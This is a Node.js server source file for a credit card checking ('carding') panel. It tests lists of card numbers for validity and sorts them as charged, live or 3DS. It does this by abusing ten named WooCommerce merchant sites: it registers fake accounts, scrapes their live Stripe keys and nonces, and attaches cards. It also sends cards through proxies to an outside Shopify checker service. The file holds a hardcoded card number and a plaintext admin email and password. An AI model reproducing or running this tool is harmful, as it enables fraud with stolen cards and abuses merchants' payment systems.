const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { CookieJar } = require('tough-cookie');
const crypto = require('crypto');
const https = require('https');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// ─── HIGH SPEED AGENTS ───
const fastHttpsAgent = new https.Agent({
  keepAlive: true,
  maxSockets: Infinity,
  rejectUnauthorized: false
});

// ─── GLOBAL MEMORY DATABASE ───
const db = {
  apiKey: '', 
  users: [
    { email: 'yousafcodes.de@gmail.com', pass: 'YOUSAFCODES.DE', role: 'admin', name: 'Oggy Admin', status: 'active' }
  ],
  sites: [],
  proxies: [],
  inbox: [],
  activity: [],
  tasks: {},
  proxyIndex: 0,
  binCache: {}
};

app.get('/api/health', (req, res) => res.send('OK'));

function formatProxy(proxyStr) {
  if (!proxyStr) return null;
  let p = proxyStr.trim();
  p = p.replace(/^(socks5|socks4|http|https):\/\//i, '');
  if (p.includes('@')) return `http://${p}`;
  const parts = p.split(':');
  if (parts.length === 4) return `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
  if (parts.length === 2) return `http://${parts[0]}:${parts[1]}`;
  return `http://${p}`;
}

function randStr(len = 10) {
  return crypto.randomBytes(len).toString('base64').replace(/[+/=]/g, '').slice(0, len).toLowerCase();
}

function uuid() {
  return crypto.randomUUID();
}

// ─── AUTH & USERS ───
app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  const user = db.users.find(u => u.email === email && u.pass === password && u.status === 'active');
  if (user) res.json({ user: { email: user.email, name: user.name, role: user.role } });
  else res.status(401).json({ error: 'Invalid credentials' });
});
app.get('/api/users', (req, res) => res.json(db.users));
app.post('/api/register', (req, res) => {
  const { email, password, name, role } = req.body;
  if (db.users.find(u => u.email === email)) return res.status(400).json({ error: 'Email exists' });
  db.users.push({ email, pass: password, name, role, status: 'active', checked: 0 });
  res.json({ success: true });
});
app.post('/api/user/status', (req, res) => {
  const user = db.users.find(u => u.email === req.body.email);
  if (user) { user.status = req.body.status; res.json({ success: true }); }
  else res.status(404).json({ error: 'Not found' });
});
app.post('/api/user/delete', (req, res) => {
  db.users = db.users.filter(u => u.email !== req.body.email);
  res.json({ success: true });
});

// ─── SETTINGS ───
app.get('/api/settings', (req, res) => res.json({ apiKey: db.apiKey }));
app.post('/api/settings', (req, res) => {
  db.apiKey = req.body.apiKey || '';
  res.json({ success: true });
});

// ─── BACKUP & RESTORE ───
app.get('/api/backup', (req, res) => {
  const backup = {
    version: 1, timestamp: new Date().toISOString(),
    sites: db.sites, proxies: db.proxies, apiKey: db.apiKey,
    users: db.users.filter(u => u.email !== 'yousafcodes.de@gmail.com'),
  };
  res.setHeader('Content-Disposition', `attachment; filename="oggy-backup-${Date.now()}.json"`);
  res.setHeader('Content-Type', 'application/json');
  res.send(JSON.stringify(backup, null, 2));
});

app.post('/api/restore', (req, res) => {
  const { backup, mode } = req.body;
  if (!backup) return res.status(400).json({ error: 'Invalid backup' });
  if (mode === 'replace') {
    db.sites = backup.sites || [];
    db.proxies = backup.proxies || [];
    if (backup.apiKey) db.apiKey = backup.apiKey;
    const admin = db.users.find(u => u.email === 'yousafcodes.de@gmail.com');
    db.users = [admin, ...(backup.users || []).filter(u => u.email !== 'yousafcodes.de@gmail.com')];
  } else {
    (backup.sites || []).forEach(s => { if (!db.sites.find(x => x.domain === s.domain)) db.sites.push(s); });
    (backup.proxies || []).forEach(p => { if (!db.proxies.includes(p)) db.proxies.push(p); });
    (backup.users || []).forEach(u => { if (!db.users.find(x => x.email === u.email)) db.users.push(u); });
  }
  res.json({ success: true, sites: db.sites.length, proxies: db.proxies.length, users: db.users.length });
});

// ─── BIN LOOKUP ───
app.get('/api/bin-lookup', async (req, res) => {
  const { bin } = req.query;
  if (!bin || bin.length < 6) return res.status(400).json({ error: 'BIN must be at least 6 digits' });
  if (db.binCache[bin]) return res.json(db.binCache[bin]);
  
  try {
    const response = await axios.get(`https://data.handyapi.com/bin/${bin}`, { timeout: 10000, validateStatus: () => true });
    if (response.status === 200 && response.data && response.data.Status === 'SUCCESS') {
      const d = response.data;
      const formatted = {
        scheme: d.Scheme || '—', type: d.Type || '—', brand: d.CardTier1 || d.CardTier2 || '—',
        prepaid: d.Prepaid === 'Yes', bank: { name: d.Issuer || '—' },
        country: { 
          name: d.Country?.Name || '—', alpha2: d.Country?.A2 || '', 
          emoji: d.Country?.A2 ? String.fromCodePoint(...[...d.Country.A2.toUpperCase()].map(c => 127397 + c.charCodeAt(0))) : '' 
        }
      };
      db.binCache[bin] = formatted;
      return res.json(formatted);
    }
  } catch(e) {}
  res.status(404).json({ error: 'BIN not found' });
});

// ─── PROXY CHECKER (For Shopify CHK) ───
async function testProxyList(proxies) {
  const liveProxies = [];
  const batchSize = 200; // Massive concurrency
  
  for (let i = 0; i < proxies.length; i += batchSize) {
    const batch = proxies.slice(i, i + batchSize);
    const results = await Promise.all(batch.map(async (p) => {
      const formatted = formatProxy(p);
      const start = Date.now();
      try {
        const agent = new HttpsProxyAgent(formatted);
        await axios.get('https://api.ipify.org?format=json', { httpsAgent: agent, timeout: 5000 });
        return { proxy: p, ms: Date.now() - start };
      } catch (err) { return null; }
    }));
    results.forEach(r => { if (r) liveProxies.push(r); });
  }
  return liveProxies.sort((a, b) => a.ms - b.ms);
}

app.post('/api/check-proxies', async (req, res) => {
  const { proxies } = req.body;
  if (!proxies || !proxies.length) return res.json({ success: true, live: [] });
  const liveProxies = await testProxyList(proxies);
  const newProxies = liveProxies.map(p => p.proxy);
  db.proxies = [...new Set([...db.proxies, ...newProxies])];
  res.json({ success: true, live: liveProxies });
});

app.post('/api/recheck-proxies', async (req, res) => {
  if (!db.proxies.length) return res.json({ success: true, count: 0 });
  const liveProxies = await testProxyList(db.proxies);
  db.proxies = liveProxies.map(p => p.proxy);
  res.json({ success: true, count: db.proxies.length });
});

app.get('/api/proxies', (req, res) => res.json(db.proxies));
app.delete('/api/proxies', (req, res) => {
  const { proxy } = req.body;
  db.proxies = db.proxies.filter(p => p !== proxy);
  res.json({ success: true, total: db.proxies.length });
});

// ─── SITES ───
app.post('/api/save-sites', (req, res) => {
  const { sites } = req.body;
  if (!sites || !sites.length) return res.json({ success: true, total: db.sites.length });
  sites.forEach(newSite => {
    const domain = (newSite.domain || newSite).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '');
    if (!domain) return;
    const price = newSite.price || 'N/A';
    if (!db.sites.find(x => x.domain === domain)) db.sites.push({ domain, price, currency: 'USD' });
  });
  res.json({ success: true, total: db.sites.length });
});

app.get('/api/sites', (req, res) => res.json(db.sites));
app.delete('/api/sites', (req, res) => {
  const { domain } = req.body;
  db.sites = db.sites.filter(s => s.domain !== domain);
  res.json({ success: true, total: db.sites.length });
});

// ─── SITE CHECKERS ───
app.post('/api/check-sites-advanced', async (req, res) => {
  const { sites, minPrice, maxPrice } = req.body;
  if (!sites || !sites.length) return res.json({ success: true, cleanSites: [] });
  const cleanSites = [];
  
  for (let i = 0; i < sites.length; i += 10) { 
    const batch = sites.slice(i, i + 10);
    await Promise.all(batch.map(async (s) => {
      let domain = s.trim().replace(/^https?:\/\//, '').replace(/\/+$/, '');
      if (!domain) return;
      
      let proxyStr = db.proxies.length > 0 ? db.proxies[Math.floor(Math.random() * db.proxies.length)] : null;
      let isLive = false, minSitePrice = Infinity;
      const options = { timeout: 10000, validateStatus: () => true, httpsAgent: fastHttpsAgent };
      if (proxyStr) {
        const formatted = formatProxy(proxyStr);
        if (formatted) options.httpsAgent = new HttpsProxyAgent(formatted);
      }

      try {
        const prodRes = await axios.get(`https://${domain}/products.json?limit=250`, options);
        if (prodRes.status === 200 && prodRes.data && Array.isArray(prodRes.data.products)) {
          let availableVariants = [];
          prodRes.data.products.forEach(prod => {
            if (prod.variants) prod.variants.forEach(v => {
              const price = parseFloat(v.price);
              if (v.available === true || v.inventory_quantity > 0 || v.inventory_quantity === undefined) availableVariants.push({ price });
              if (!isNaN(price) && price > 0 && price < minSitePrice) minSitePrice = price;
            });
          });
          if (availableVariants.length > 0) isLive = true;
        }
      } catch (err) {}
      if (isLive && minSitePrice >= minPrice && minSitePrice <= maxPrice) cleanSites.push({ domain, price: minSitePrice.toFixed(2), method: 'Scrape' });
    }));
  }
  res.json({ success: true, cleanSites });
});

app.post('/api/check-sites-api', async (req, res) => {
  const { sites, minPrice, maxPrice } = req.body;
  if (!sites || !sites.length) return res.json({ success: true, cleanSites: [] });

  const cleanSites = [];
  const testCard = '5137415838183486|06|2030|633';
  
  for (let i = 0; i < sites.length; i += 10) {
    const batch = sites.slice(i, i + 10);
    await Promise.all(batch.map(async (s) => {
      let domain = s.trim().replace(/^https?:\/\//, '').replace(/\/+$/, '');
      if (!domain) return;

      let proxyStr = db.proxies.length > 0 ? db.proxies[Math.floor(Math.random() * db.proxies.length)] : null;
      let options = { timeout: 15000, httpsAgent: fastHttpsAgent };
      
      const targetUrl = new URL('https://check.yzio.app/shopify');
      targetUrl.searchParams.append('site', domain);
      targetUrl.searchParams.append('cc', testCard);
      if (db.apiKey) targetUrl.searchParams.append('key', db.apiKey.trim());
      
      if (proxyStr) {
        const formatted = formatProxy(proxyStr);
        if (formatted) options.httpsAgent = new HttpsProxyAgent(formatted);
        targetUrl.searchParams.append('proxy', proxyStr);
      }

      try {
        const response = await axios.get(targetUrl.toString(), options);
        const sitePrice = parseFloat(response.data.Price);
        if (!isNaN(sitePrice) && sitePrice > 0 && sitePrice >= minPrice && sitePrice <= maxPrice) {
          cleanSites.push({ domain, price: sitePrice.toFixed(2), method: 'API' });
        }
      } catch (err) {}
    }));
  }
  res.json({ success: true, cleanSites });
});

// ─── STRIPE AUTH 0$ (100% PROXY-FREE, ULTRA FAST) ───
const STRIPE_SITES = [
  "https://innercitytigers.com",
  "https://www.professionalmarine.eu",
  "https://www.domainegayda.com",
  "https://ecolution-hubs.co.uk",
  "https://shop.nemaneide.com",
  "https://www.thebotanicalco.com",
  "https://www.thevintagemariner.com",
  "https://www.livealoha.com",
  "https://www.shoppetz.com",
  "https://www.modernboho.com"
];

const NONCE_PATTERNS = [
  /"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"/,
  /"createSetupIntentNonce"\s*:\s*"(.*?)"/,
  /"ajax_nonce"\s*:\s*"([a-f0-9]+)"/,
  /wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"/,
  /id="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"/,
  /"_ajax_nonce"\s*:\s*"([a-f0-9]+)"/,
  /"nonce"\s*:\s*"([a-f0-9]+)"/,
];

function isBadBody(text) {
  if (!text) return true;
  const s = String(text).trim();
  if (["", "0", "null", "false", "-1", "undefined"].includes(s.toLowerCase())) return true;
  if (s.startsWith('{') && s.endsWith('}')) {
    try {
      const j = JSON.parse(s);
      if (!j || Object.keys(j).length === 0) return true;
      if (j.success === false && !j.data) return true;
    } catch (e) {}
  }
  return false;
}

function classifyStripeResponse(text) {
  if (isBadBody(text)) return { Response: 'Empty AJAX (session mismatch)', Gateway: 'Stripe-Auth2', Price: '$0' };
  const rl = text.toLowerCase();
  
  const errMatch = text.match(/"decline_code"\s*:\s*"([^"]+)"/) || text.match(/"message"\s*:\s*"([^"]+)"/) || text.match(/"code"\s*:\s*"([^"]+)"/);
  const errMsg = errMatch ? errMatch[1].toUpperCase() : '';

  if (/"(success|status)"\s*:\s*"?(true|succeeded)"?/i.test(rl) || rl.includes('payment method added')) {
    if (rl.includes('decline') || rl.includes('card_declined')) return { Response: errMsg || 'CARD_DECLINED', Gateway: 'Stripe-Auth2', Price: '$0' };
    return { Response: 'Payment Method Added Successfully', Gateway: 'Stripe-Auth2', Price: '$0' };
  }
  if (/requires_action|authentication_required|3d_secure|requires_confirmation|redirect_to_url/i.test(rl)) return { Response: 'LIVE · 3DS Required', Gateway: 'Stripe-Auth2', Price: '$0' };
  if (rl.includes('card_not_supported')) return { Response: 'card_not_supported', Gateway: 'Stripe-Auth2', Price: '$0' };
  if (/incorrect_cvc|incorrect_zip|insufficient_funds|invalid_cvc|cvc_check_failed/i.test(rl)) return { Response: errMsg || 'CCN LIVE', Gateway: 'Stripe-Auth2', Price: '$0' };
  if (/card_declined|generic_decline|do_not_honor|fraudulent|lost_card|stolen_card|pickup_card|restricted_card|transaction_not_allowed|security_violation/i.test(rl)) return { Response: errMsg || 'CARD_DECLINED', Gateway: 'Stripe-Auth2', Price: '$0' };
  if (rl.includes('expired_card') || rl.includes('expired')) return { Response: 'EXPIRED_CARD', Gateway: 'Stripe-Auth2', Price: '$0' };
  if (/velocity|too_many|rate_limit/i.test(rl)) return { Response: errMsg || 'VELOCITY_EXCEEDED', Gateway: 'Stripe-Auth2', Price: '$0' };
  if (errMsg) return { Response: errMsg, Gateway: 'Stripe-Auth2', Price: '$0' };

  return { Response: 'Unknown Response', Gateway: 'Stripe-Auth2', Price: '$0' };
}

async function tryStripeSite(siteUrl, cc, mm, yy, cvv) {
  const siteDomain = siteUrl.replace(/^https?:\/\//, '').replace(/\/+$/, '');
  const email = `${randStr(10)}@gmail.com`;
  const UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36';
  
  const jar = new CookieJar();
  const getCookies = async (url) => {
    try { return (await jar.getCookies(url)).map(c => `${c.key}=${c.value}`).join('; '); } catch(e) { return ''; }
  };
  const setCookies = async (url, headers) => {
    if (!headers) return;
    for (const c of headers) { try { await jar.setCookie(c, url); } catch(e) {} }
  };

  try {
    // 1. Get PK (Direct connection, no proxy)
    let stripePk = null;
    for (const url of [`${siteUrl}/my-account/add-payment-method/`, `${siteUrl}/my-account/`, `${siteUrl}/`]) {
      try {
        const r = await axios.get(url, { headers: { 'User-Agent': UA, Cookie: await getCookies(url) }, httpsAgent: fastHttpsAgent, timeout: 8000, validateStatus: () => true });
        await setCookies(url, r.headers['set-cookie']);
        if (r.status === 403) return { Response: 'CF_BLOCK', Gateway: 'Stripe', Price: '$0' };
        const m = r.data.match(/pk_live_[a-zA-Z0-9]{20,}/);
        if (m) { stripePk = m[0]; break; }
      } catch (e) {}
    }
    if (!stripePk) return { Response: 'NO_PK', Gateway: 'Stripe', Price: '$0' };

    // 2. Get Reg Nonce
    let regNonce = null;
    for (const p of ['/my-account/', '/register/']) {
      try {
        const url = `${siteUrl}${p}`;
        const r = await axios.get(url, { headers: { 'User-Agent': UA, Cookie: await getCookies(url) }, httpsAgent: fastHttpsAgent, timeout: 8000, validateStatus: () => true });
        await setCookies(url, r.headers['set-cookie']);
        const m = r.data.match(/name="woocommerce-register-nonce"\s+value="([^"]+)"/) || r.data.match(/id="woocommerce-register-nonce"[^>]*value="([^"]+)"/);
        if (m) { regNonce = m[1]; break; }
      } catch (e) {}
    }
    if (!regNonce) return { Response: 'NO_REG_NONCE', Gateway: 'Stripe', Price: '$0' };

    // 3. Register
    const regUrl = `${siteUrl}/my-account/`;
    const regData = new URLSearchParams({ email, '_wp_http_referer': '/my-account/', 'register': 'Register', 'woocommerce-register-nonce': regNonce }).toString();
    const regRes = await axios.post(regUrl, regData, {
      headers: { 'User-Agent': UA, Cookie: await getCookies(regUrl), 'Content-Type': 'application/x-www-form-urlencoded', Origin: siteUrl, Referer: regUrl },
      httpsAgent: fastHttpsAgent, timeout: 8000, validateStatus: () => true
    });
    await setCookies(regUrl, regRes.headers['set-cookie']);

    const cookieStr = await getCookies(siteUrl);
    if (!cookieStr.includes('wordpress_logged_in')) return { Response: 'REG_FAILED', Gateway: 'Stripe', Price: '$0' };

    // 4. Get Setup Nonce
    let nonce = null;
    for (const p of ['/my-account/add-payment-method/', '/checkout/']) {
      try {
        const url = `${siteUrl}${p}`;
        const r = await axios.get(url, { headers: { 'User-Agent': UA, Cookie: await getCookies(url) }, httpsAgent: fastHttpsAgent, timeout: 8000, validateStatus: () => true });
        await setCookies(url, r.headers['set-cookie']);
        for (const pat of NONCE_PATTERNS) {
          const m = r.data.match(pat);
          if (m) { nonce = m[1]; break; }
        }
        if (nonce) break;
      } catch (e) {}
    }
    if (!nonce) return { Response: 'NO_SETUP_NONCE', Gateway: 'Stripe', Price: '$0' };

    // 5. Create PM (Direct)
    const stripeData = `type=card&card[number]=${cc}&card[cvc]=${cvv}&card[exp_year]=${yy}&card[exp_month]=${mm}&billing_details[address][postal_code]=10080&billing_details[address][country]=US&billing_details[name]=John%20Doe&billing_details[email]=${email}&key=${stripePk}`;
    const stripeRes = await axios.post('https://api.stripe.com/v1/payment_methods', stripeData, {
      headers: { 'User-Agent': UA, 'Content-Type': 'application/x-www-form-urlencoded' },
      httpsAgent: fastHttpsAgent, timeout: 10000, validateStatus: () => true
    });

    if (stripeRes.data && stripeRes.data.error) {
      const err = stripeRes.data.error;
      const display = (err.decline_code || err.code || err.message || 'TOKENIZATION_FAILED').toString();
      return { Response: display.toUpperCase(), Gateway: 'Stripe', Price: '$0' };
    }

    const pmId = stripeRes.data.id;
    if (!pmId) return { Response: 'PM_FAILED', Gateway: 'Stripe', Price: '$0' };

    // 6. Confirm Setup
    let resultText = '';
    for (const [url, params] of [[`${siteUrl}/`, { 'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent' }], [`${siteUrl}/wp-admin/admin-ajax.php`, {}]]) {
      try {
        const body = new URLSearchParams({ action: 'create_and_confirm_setup_intent', 'wc-stripe-payment-method': pmId, 'wc-stripe-payment-type': 'card', '_ajax_nonce': nonce }).toString();
        const r = await axios.post(url, body, {
          params, headers: { 'User-Agent': UA, Cookie: await getCookies(url), 'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', Origin: siteUrl, Referer: `${siteUrl}/my-account/add-payment-method/` },
          httpsAgent: fastHttpsAgent, timeout: 10000, validateStatus: () => true
        });
        resultText = r.data;
        if (r.status === 200 && !isBadBody(resultText)) break;
      } catch (e) {}
    }
    
    if (isBadBody(resultText)) return { Response: 'BAD_AJAX', Gateway: 'Stripe', Price: '$0' };
    return classifyStripeResponse(resultText);
  } catch (err) {
    return { Response: `NETWORK_ERROR`, Gateway: 'Stripe', Price: '$0' };
  }
}

async function stripeAuth2Check(cardStr) {
  const parts = cardStr.split('|');
  if (parts.length !== 4) return { Response: 'Invalid card format', Gateway: 'Stripe-Auth2', Price: '$0' };
  let [cc, mm, yy, cvv] = parts.map(s => s.trim());
  if (yy.length === 2) yy = '20' + yy;

  const sites = [...STRIPE_SITES].sort(() => Math.random() - 0.5);
  for (const site of sites) {
    try {
      const result = await tryStripeSite(site, cc, mm, yy, cvv);
      if (result && !['CF_BLOCK', 'NO_PK', 'NO_REG_NONCE', 'REG_FAILED', 'NO_SETUP_NONCE', 'PM_FAILED', 'BAD_AJAX', 'NETWORK_ERROR'].includes(result.Response)) {
        return result;
      }
    } catch (e) {}
  }
  return { Response: 'All sites failed (or blocked)', Gateway: 'Stripe-Auth2', Price: '$0' };
}

// ─── BACKGROUND TASK SYSTEM ───
app.post('/api/start-task', (req, res) => {
  const { email, cards, type } = req.body;
  if (!email || !cards || !cards.length) return res.status(400).json({ error: 'Missing data' });
  if (db.tasks[email] && db.tasks[email].status === 'running') return res.status(400).json({ error: 'Task already running' });

  db.tasks[email] = { status: 'running', type: type || 'shopify', queue: [...cards], results: [], total: cards.length, checked: 0 };
  processUserTask(email);
  res.json({ success: true });
});

app.get('/api/task-status', (req, res) => {
  const email = req.query.email;
  const task = db.tasks[email];
  if (!task) return res.json({ active: false });
  res.json({ active: task.status === 'running', task });
});

app.post('/api/stop-task', (req, res) => {
  const { email } = req.body;
  if (db.tasks[email]) db.tasks[email].status = 'stopped';
  res.json({ success: true });
});

function getNextProxy() {
  if (db.proxies.length === 0) return null;
  const proxy = db.proxies[db.proxyIndex % db.proxies.length];
  db.proxyIndex++;
  return proxy;
}

// ─── SHOPIFY CHECK LOGIC ───
async function checkShopifyCard(cc) {
  let attempts = 0;
  while (attempts < 3) {
    attempts++;
    let proxyStr = getNextProxy();
    let proxyUrl = proxyStr ? formatProxy(proxyStr) : null;
    const siteObj = db.sites.length > 0 ? db.sites[Math.floor(Math.random() * db.sites.length)] : { domain: 'shopify.com' };
    const siteDomain = siteObj.domain;

    const targetUrl = new URL('https://check.yzio.app/shopify');
    targetUrl.searchParams.append('site', siteDomain);
    targetUrl.searchParams.append('cc', cc);
    if (db.apiKey) targetUrl.searchParams.append('key', db.apiKey.trim());
    if (proxyStr) targetUrl.searchParams.append('proxy', proxyStr);

    try {
      const options = { timeout: 25000, httpsAgent: fastHttpsAgent };
      if (proxyUrl) options.httpsAgent = new HttpsProxyAgent(proxyUrl);
      const response = await axios.get(targetUrl.toString(), options);
      const data = response.data;
      const apiResponse = String(data.Response || data.response || data.status || data.result || '').toUpperCase();

      if (data.Proxy === 'Dead' || apiResponse.includes('PROXY ERROR')) {
        if (proxyStr) db.proxies = db.proxies.filter(p => p !== proxyStr);
        continue;
      }
      if (apiResponse.includes('THROTTLED')) { await new Promise(r => setTimeout(r, 2000)); continue; }

      const sitePrice = parseFloat(data.Price);
      if (!isNaN(sitePrice) && sitePrice > 3.00) db.sites = db.sites.filter(s => s.domain !== siteDomain);

      return { success: true, data, site: siteDomain };
    } catch (err) {
      if (proxyStr && (err.code === 'ECONNABORTED' || err.message.includes('connect'))) db.proxies = db.proxies.filter(p => p !== proxyStr);
      await new Promise(r => setTimeout(r, 1000));
    }
  }
  return { success: false, error: 'Max retries reached' };
}

function classifyShopifyResult(data) {
  const apiResponse = String(data.Response || data.response || data.status || data.result || '').toUpperCase();
  const gateway = data.Gateway || '', price = data.Price || null;
  let displayLabel = 'UNKNOWN', uiStatus = 'unknown';

  if (/CHARGED|SUCCESS|ORDER_PAID/.test(apiResponse)) { displayLabel = 'CHARGED'; uiStatus = 'charged'; }
  else if (/LIVE|APPROVED|INSUFFICIENT/.test(apiResponse)) { displayLabel = 'LIVE'; uiStatus = 'live'; }
  else if (/3DS|OTP|AUTHENTICATION|REQUIRED_ARTIFACTS_UNAVAILABLE/.test(apiResponse)) { displayLabel = '3D'; uiStatus = 'otp'; }
  else { displayLabel = 'DECLINED'; uiStatus = 'declined'; }

  let message = apiResponse;
  if (gateway) message = `${gateway} - ${apiResponse}`;
  if (price) message += ` ($${price})`;

  return { displayLabel, uiStatus, message };
}

// ─── MULTI-THREADED TASK PROCESSOR (MASSIVE CONCURRENCY) ───
async function processUserTask(email) {
  const task = db.tasks[email];
  const isStripe = task.type === 'stripe';
  
  // HUGE CONCURRENCY FOR 12 CPU SERVER
  // Stripe is 100% direct, so we can do 100 at a time.
  // Shopify uses proxies, so 50 at a time to avoid burning them too fast.
  const concurrency = isStripe ? 100 : 50; 
  
  const processOne = async (cc) => {
    let resultObj, site = null;
    if (isStripe) {
      const r = await stripeAuth2Check(cc); // Direct connection
      resultObj = { displayLabel: r.Response, uiStatus: classifyStripeStatus(r.Response), message: r.Response, gateway: r.Gateway, raw: r };
    } else {
      const r = await checkShopifyCard(cc);
      if (!r.success) { task.results.push({ id: Date.now() + Math.random(), cc, site: null, status: 'unknown', label: 'ERROR', message: r.error || 'Failed', rawJSON: {}, time: new Date().toISOString() }); task.checked++; return; }
      site = r.site;
      const cls = classifyShopifyResult(r.data);
      resultObj = { displayLabel: cls.displayLabel, uiStatus: cls.uiStatus, message: cls.message, raw: r.data };
    }
    
    const entry = { id: Date.now() + Math.random(), cc, site, status: resultObj.uiStatus, label: resultObj.displayLabel, message: resultObj.message, rawJSON: resultObj.raw, time: new Date().toISOString() };
    task.results.push(entry);
    db.activity.unshift({ user: email, action: 'check', card: cc, result: resultObj.uiStatus, time: entry.time });
    if (db.activity.length > 500) db.activity.pop();
    
    if (resultObj.uiStatus === 'charged' || resultObj.uiStatus === 'live') {
      db.inbox.unshift({ user: email, cc, message: resultObj.displayLabel, raw: resultObj.raw, site, time: entry.time });
      if (db.inbox.length > 500) db.inbox.pop();
    }
    task.checked++;
  };
  
  const worker = async () => {
    while (task.queue.length > 0 && task.status === 'running') {
      const cc = task.queue.shift();
      if (!cc) break;
      await processOne(cc);
    }
  };
  
  const workers = Array.from({ length: concurrency }, () => worker());
  await Promise.all(workers);
  task.status = 'done';
}

function classifyStripeStatus(response) {
  const r = String(response || '').toUpperCase();
  if (/PAYMENT METHOD ADDED|SUCCESS|CHARGED/.test(r)) return 'charged';
  if (/LIVE|CCN|3DS|REQUIRES_ACTION/.test(r)) return 'live';
  if (/OTP|AUTHENTICATION/.test(r)) return 'otp';
  return 'declined';
}

// ─── REPORTING ───
app.get('/api/admin/data', (req, res) => {
  const email = req.query.email;
  let inbox = db.inbox, activity = db.activity;
  if (email && email !== 'yousafcodes.de@gmail.com') {
    inbox = inbox.filter(i => i.user === email);
    activity = activity.filter(a => a.user === email);
  }
  res.json({ inbox, activity });
});

app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));